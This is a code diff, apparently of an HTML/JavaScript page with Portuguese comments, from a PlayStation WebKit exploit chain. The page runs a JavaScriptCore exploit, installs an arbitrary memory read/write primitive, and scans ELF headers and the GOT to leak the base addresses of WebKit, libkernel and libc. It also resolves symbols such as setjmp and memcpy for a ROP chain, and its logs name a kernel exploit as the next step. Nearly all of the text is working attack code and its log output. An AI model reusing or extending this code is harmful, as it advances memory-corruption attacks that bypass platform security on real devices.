-      addLibRow(soname, key);
-    }
-
-    if (i % 8 === 0) await new Promise(r => setTimeout(r, 0));
-  }
-  return [...seen.values()];
+    return null;
 }
 
-/* ─── Display constants after base is found ─────────────── */
-function showConstants(webkitBase, ctorPtr, textAnchor) {
-  const baseN = i64n(webkitBase);
-  const lines = document.getElementById('c-lines');
-  const usage = document.getElementById('c-usage');
-  lines.innerHTML = '';
-  usage.innerHTML = '';
-
-  function addLine(txt, cls = '') {
-    const d = document.createElement('div');
-    d.className = cls;
-    d.textContent = txt;
-    lines.appendChild(d);
-  }
-
-  if (ctorPtr) {
-    const rva = i64n(ctorPtr) - baseN;
-    addLine('const WEBKIT_CTOR_RVA   = 0x' + rva.toString(16).toUpperCase() + ';'
-      + '  // __ps5NativeCtor offset');
-  }
-  if (textAnchor) {
-    const rva = i64n(textAnchor) - baseN;
-    addLine('const WEBKIT_ANCHOR_RVA = 0x' + rva.toString(16).toUpperCase() + ';'
-      + '  // min .text fn ptr offset');
-  }
-  addLine('');
-  addLine('// Uso direto (elimina scan em futuras execuções):');
-  addLine('// const webkitBase = __ps5NativeCtor - WEBKIT_CTOR_RVA;');
-
-  $cbox.style.display = 'block';
+// ─── descobre libs via GOT ────────────────────────────────────────────────────
+async function discoverImports(p, dyn, label) {
+    if (!dyn?.pltgot) return [];
+    const n    = dyn.pltrelsz ? Math.floor(dyn.pltrelsz/0x18)+3 : 256;
+    const seen = new Map();
+    for (let i = 3; i < n; i++) {
+        let slot;
+        try { slot = p.read8(dyn.pltgot.add32(i*8)); } catch(_) { continue; }
+        if (!slot.hi || slot.hi > 0xFFFF) continue;
+        if (slot.low & 3) continue;
+        const base = await findElfBase(p, slot, `import[${i}]`);
+        if (!base) continue;
+        const key = base.toString();
+        if (!seen.has(key)) {
+            const d = parseDynamic(p, base);
+            const s = d?.soname || '<NID>';
+            seen.set(key, { base, dyn:d, soname:s });
+            log(`  → 0x${key}  ${s}`, 'log-addr');
+            addLibRow(s, key);
+        }
+    }
+    return [...seen.values()];
 }
 
-/* ─── MAIN: leakAllBases ─────────────────────────────────── */
+// ─── LEAK PRINCIPAL ──────────────────────────────────────────────────────────
 async function leakAllBases(p) {
-  /* FASE 1 */
-  log('', ''); log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
-  await tryProcMaps();
+    log('', '');
+    log('══ FASE 1: /proc/self/maps ════════════════════', 'log-section');
+    await tryMaps();
 
-  /* FASE 2 */
-  log('', ''); log('-- FASE 2: ponteiro inicial no WebKit ---------', 'log-section');
-  const ctorPtr = getWebKitPointer(p);
-
-  /* FASE 2.5 — âncora em .text via vtable
-     ─────────────────────────────────────────────────────────
-     POR QUE ESTA FASE EXISTE:
-     O __ps5NativeCtor no PS4 aponta para a região .data do
-     WebKit (segmento RW, endereço MAIOR que .rodata e .text).
-     Scan retroativo a partir de .data cruza o gap entre
-     PT_LOAD[.data] e PT_LOAD[.text] → SIGSEGV → crash.
-
-     Solução: obtemos um fn ptr de um slot da vtable da textarea,
-     que sempre fica em .text (PT_LOAD executável, contíguo com
-     o ELF header). O scan de 15 MB fica 100% dentro de .text.
-     ─────────────────────────────────────────────────────────  */
-  log('', ''); log('-- FASE 2.5: âncora em .text (vtable slots) ---', 'log-section');
-  const textAnchor = getTextAnchor(p);
-
-  if (!textAnchor) {
-    log('[-] Sem âncora em .text — scan cancelado para evitar crash', 'log-error');
-    setStatus('Falha: âncora .text indisponível', 'error');
-    return null;
-  }
-
-  /* FASE 3 */
-  log('', ''); log('-- FASE 3: ELF scan — WebKit ------------------', 'log-section');
-  log('[!] Usando âncora .text 0x' + textAnchor.toString()
-    + ' (não o ctor — evita crash de segmento)', 'log-warn');
-
-  const webkitBase = await findElfBase(p, textAnchor, 'WebKit');
-  if (!webkitBase) {
-    setStatus('Falha: WebKit base não encontrada', 'error');
-    return null;
-  }
-
-  setCard('card-webkit', '0x' + webkitBase.toString());
-  $bases.classList.add('visible');
-  showConstants(webkitBase, ctorPtr, textAnchor);
-
-  /* FASE 4 */
-  log('', ''); log('-- FASE 4: parse DYNAMIC do WebKit ------------', 'log-section');
-  const wkDyn = parseDynamic(p, webkitBase);
-  if (wkDyn) {
-    log('  SONAME:   ' + (wkDyn.soname || '<vazio>'), 'log-info');
-    log('  strtab:  0x' + (wkDyn.strtab?.toString() || '?'), 'log-dim');
-    log('  pltgot:  0x' + (wkDyn.pltgot?.toString() || '?'), 'log-dim');
-    log('  pltrelsz: ' + wkDyn.pltrelsz, 'log-dim');
-  } else {
-    log('  Falhou ao parsear DYNAMIC', 'log-warn');
-  }
-
-  /* FASE 5 */
-  log('', ''); log('-- FASE 5: descobrindo libs importadas --------', 'log-section');
-  const imports = await discoverImports(p, wkDyn, 'WebKit');
-  log('  Total: ' + imports.length + ' módulos', 'log-info');
-
-  // Identifica libkernel / libc
-  let lkEntry = null, lcEntry = null;
-  for (const lib of imports) {
-    const s = lib.soname.toLowerCase();
-    if (!lkEntry && (s.includes('kernel') || s.includes('libkernel'))) lkEntry = lib;
-    if (!lcEntry && (s.includes('libc')   || s.includes('libscelibc')))  lcEntry = lib;
-  }
-  if (!lkEntry && imports.length > 0) {
-    // Heurística PS4: libkernel é a lib com menor endereço base
-    const sorted = [...imports].sort((a,b) => i64n(a.base) - i64n(b.base));
-    lkEntry = sorted[0];
-    log('  [!] SONAMEs = NIDs. Assumindo libkernel = menor base: 0x'
-      + lkEntry.base.toString(), 'log-warn');
-  }
-  if (lkEntry) { setCard('card-kernel', '0x' + lkEntry.base.toString()); }
-  if (lcEntry) { setCard('card-libc',   '0x' + lcEntry.base.toString()); }
-
-  /* FASE 6 */
-  log('', ''); log('-- FASE 6: resolução de símbolos --------------', 'log-section');
-  const NEEDED = ['setjmp','longjmp','memset','memcpy',
-                  'pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
-  const symbols = {};
-  for (const sym of NEEDED) {
-    let found = false;
-    for (const lib of imports) {
-      if (!lib.dyn) continue;
-      const addr = findSymbol(p, lib.base, lib.dyn, sym);
-      if (addr) {
-        symbols[sym] = addr;
-        log('  [+] ' + sym.padEnd(28) + ' 0x' + addr.toString(), 'log-ok');
-        found = true; break;
-      }
+    log('', '');
+    log('══ FASE 2 + 2.5: Âncora .text ════════════════', 'log-section');
+    const anchor = getTextAnchor(p);
+    if (!anchor) {
+        setStatus('Falha: sem ponteiro para WebKit .text', 'error');
+        return null;
     }
-    if (!found)
-      log('  [-] ' + sym.padEnd(28) + ' não encontrado (NID?)', 'log-dim');
-  }
+    setCard('card-ctor', '0x' + anchor.toString());
 
-  /* resultado */
-  const result = {
-    webkitBase, ctorPtr, textAnchor,
-    libkernelBase: lkEntry?.base || null,
-    libcBase: lcEntry?.base || null,
-    allLibs: imports, symbols
-  };
+    log('', '');
+    log('══ FASE 3: ELF scan (2 estágios) ══════════════', 'log-section');
+    const webkitBase = await findElfBase(p, anchor, 'WebKit');
+    if (!webkitBase) {
+        setStatus('Falha: WebKit base não encontrada', 'error');
+        return null;
+    }
+    setCard('card-webkit', '0x' + webkitBase.toString());
+    $grid.classList.add('visible');
 
-  log('', ''); log('-- RESULTADO FINAL ----------------------------', 'log-section');
-  log('webkitBase    = 0x' + result.webkitBase.toString(), 'log-addr');
-  log('libkernelBase = 0x' + (result.libkernelBase?.toString() || '?'), 'log-addr');
-  log('libcBase      = 0x' + (result.libcBase?.toString() || '?'), 'log-addr');
-  log('', '');
-  log('window._exploit disponível', 'log-ok');
-  globalThis._exploit = result;
-  return result;
+    log('', '');
+    log('══ FASE 4: parse DYNAMIC WebKit ════════════════', 'log-section');
+    const wkDyn = parseDynamic(p, webkitBase);
+    log(`  SONAME : ${wkDyn?.soname || '<vazio>'}`, 'log-info');
+    log(`  strtab : 0x${wkDyn?.strtab?.toString() || '?'}`, 'log-dim');
+    log(`  pltgot : 0x${wkDyn?.pltgot?.toString() || '?'}`, 'log-dim');
+    log(`  pltrelsz: ${wkDyn?.pltrelsz || 0}`, 'log-dim');
+
+    log('', '');
+    log('══ FASE 5: Libs importadas pela GOT ════════════', 'log-section');
+    const imports = await discoverImports(p, wkDyn, 'WebKit');
+    log(`  ${imports.length} módulo(s) encontrado(s)`, 'log-info');
+
+    let lkEntry = null, lcEntry = null;
+    for (const lib of imports) {
+        const s = lib.soname.toLowerCase();
+        if (!lkEntry && s.includes('kernel')) lkEntry = lib;
+        if (!lcEntry && (s.includes('libc') || s.includes('libscelibcinternal'))) lcEntry = lib;
+    }
+
+    // fallback heurístico: menor base = provavelmente libkernel
+    if (!lkEntry && imports.length) {
+        const sorted = [...imports].sort((a,b) =>
+            a.base.hi !== b.base.hi ? a.base.hi-b.base.hi : a.base.low-b.base.low);
+        lkEntry = sorted[0];
+        log('[!] SONAME ilegível — assumindo libkernel = menor base', 'log-warn');
+    }
+
+    if (lkEntry) { setCard('card-kernel', '0x'+lkEntry.base.toString()); log('[+] libkernel: 0x'+lkEntry.base.toString(),'log-ok'); }
+    if (lcEntry) { setCard('card-libc',   '0x'+lcEntry.base.toString()); log('[+] libc:      0x'+lcEntry.base.toString(),'log-ok'); }
+
+    log('', '');
+    log('══ FASE 6: Símbolos para ROP ═══════════════════', 'log-section');
+    const NEEDED = ['setjmp','longjmp','memset','memcpy',
+                    'pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
+    const symbols = {};
+    for (const sym of NEEDED) {
+        let found = false;
+        for (const lib of imports) {
+            const addr = findSymbol(p, lib.base, lib.dyn, sym);
+            if (addr) { symbols[sym]=addr; log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`,'log-ok'); found=true; break; }
+        }
+        if (!found) log(`  [-] ${sym.padEnd(28)} não encontrado (NID/ausente)`,'log-dim');
+    }
+
+    const result = { webkitBase, libkernelBase:lkEntry?.base||null,
+                     libcBase:lcEntry?.base||null, allLibs:imports, symbols };
+
+    log('', '');
+    log('══ RESULTADO ═══════════════════════════════════', 'log-section');
+    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
+    log(`libkernelBase = 0x${result.libkernelBase?.toString()||'?'}`, 'log-addr');
+    log(`libcBase      = 0x${result.libcBase?.toString()||'?'}`, 'log-addr');
+    log('window._exploit pronto.', 'log-ok');
+    globalThis._exploit = result;
+    return result;
 }
 
-/* ─── Core.js event handler ──────────────────────────────── */
+// ─── onCoreEvent ─────────────────────────────────────────────────────────────
 function onCoreEvent(tag, detail, attempt) {
-  if (attempt !== undefined) $atTxt.textContent = 'tentativa: ' + attempt;
-  $stgTxt.textContent = 'estágio: ' + tag.toLowerCase();
-  const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
-    'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
-    'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
-  if (VERBOSE.includes(tag)) { log('  ' + tag + ': ' + detail, 'log-dim'); return; }
-  const isOk  = tag.includes('UP') || tag.includes('OK') || tag.includes('SUCCESS');
-  const isErr = tag.includes('FAIL') || tag.includes('ERROR') || tag.includes('GIVE-UP');
-  log('[' + tag + '] ' + detail, isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info');
+    if (attempt !== undefined) $attTxt.textContent = `tentativa: ${attempt}`;
+    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
+    const QUIET = new Set(['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
+                           'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
+                           'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE']);
+    if (QUIET.has(tag)) { log(`  ${tag}: ${detail}`, 'log-dim'); return; }
+    const cls = tag.includes('UP')||tag.includes('OK')||tag.includes('SUCCESS') ? 'log-ok'
+              : tag.includes('FAIL')||tag.includes('ERR')||tag.includes('GIVE') ? 'log-error'
+              : 'log-info';
+    log(`[${tag}] ${detail}`, cls);
 }
 
-/* ─── BOOT ───────────────────────────────────────────────── */
+// ─── BOOT ─────────────────────────────────────────────────────────────────────
 (async () => {
-  log('UA: ' + ua, 'log-dim');
-  log('Firmware: ' + (fwStr || 'desconhecido'), 'log-info');
-  log('', '');
+    log(`UA: ${ua}`, 'log-dim');
+    log(`Firmware: ${fwStr || 'desconhecido'}`, 'log-info');
 
-  setStatus('Rodando exploit JSC (core.js)…', 'running');
-  log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
+    setStatus('Rodando exploit JSC (core.js)…', 'running');
+    log('', '');
+    log('══ EXPLOIT JSC ═════════════════════════════════', 'log-section');
 
-  let carrier;
-  try {
-    carrier = await establishPrimitive({ onEvent: onCoreEvent, maxAttempts: 0 });
-  } catch(err) {
-    setStatus('core.js falhou: ' + err.message, 'error');
-    log('[ERRO] ' + err.message, 'log-error');
-    return;
-  }
-  log('[+] core.js: primitivo JSC estabelecido!', 'log-ok');
-  log('', '');
+    let carrier;
+    try {
+        // FIX #1 e #2 — export correto + opção correta
+        carrier = await startFn({
+            onEvent: onCoreEvent,
+            attemptCeiling: 0   // ← FIX #2: era maxAttempts (não existe), deve ser attemptCeiling
+        });
+    } catch (err) {
+        setStatus('core.js falhou: ' + err.message, 'error');
+        log('[ERRO core.js] ' + err.message, 'log-error');
+        log('Verifique: o export do core.js é startCore ou establishPrimitive?', 'log-warn');
+        return;
+    }
 
-  log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
-  setStatus('Instalando primitiva de memória…', 'running');
+    log('[+] exploit JSC ok — carrier pronto', 'log-ok');
+    log('', '');
+    log('══ INSTALANDO R/W (mem.js) ═════════════════════', 'log-section');
+    setStatus('Instalando primitiva de memória…', 'running');
 
-  let p;
-  try {
-    p = installWindowP(carrier, {
-      promote: true,
-      onEvent: (tag, detail) => log('  [mem/' + tag + '] ' + detail, 'log-dim')
-    });
-  } catch(err) {
-    setStatus('mem.js falhou: ' + err.message, 'error');
-    log('[ERRO] ' + err.message, 'log-error');
-    return;
-  }
-  log('[+] R/W arbitrário: window.p instalado', 'log-ok');
-  log('', '');
+    let p;
+    try {
+        p = installWindowP(carrier, {
+            promote: true,
+            onEvent: (tag, detail) => log(`  [mem/${tag}] ${detail}`, 'log-dim')
+        });
+    } catch (err) {
+        setStatus('mem.js falhou: ' + err.message, 'error');
+        log('[ERRO mem.js] ' + err.message, 'log-error');
+        return;
+    }
+    log('[+] R/W arbitrário: window.p instalado', 'log-ok');
 
-  setStatus('Vazando endereços base…', 'running');
-  log('-- LEAK DE BASES -------------------------------', 'log-section');
+    setStatus('Vazando bases…', 'running');
+    let bases;
+    try {
+        bases = await leakAllBases(p);
+    } catch (err) {
+        setStatus('leakAllBases falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
+    }
 
-  let bases;
-  try {
-    bases = await leakAllBases(p);
-  } catch(err) {
-    setStatus('leakAllBases falhou: ' + err.message, 'error');
-    log('[ERRO] ' + err.message, 'log-error');
-    return;
-  }
-
-  if (!bases) { setStatus('Falha no leak de bases', 'error'); return; }
-
-  setStatus('Bases vazadas — próximo: ROP chain', 'ok');
-  log('', '');
-  log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
-  log('window._exploit contém todas as bases e símbolos.', 'log-dim');
+    if (!bases) { setStatus('Falha no leak de bases', 'error'); return; }
+    setStatus('Bases vazadas ✓ — próximo: ROP chain', 'ok');
+    log('Próximo passo: ROP chain / kernel exploit.', 'log-info');
 })();
+
 </script>
 </body>
 </html>
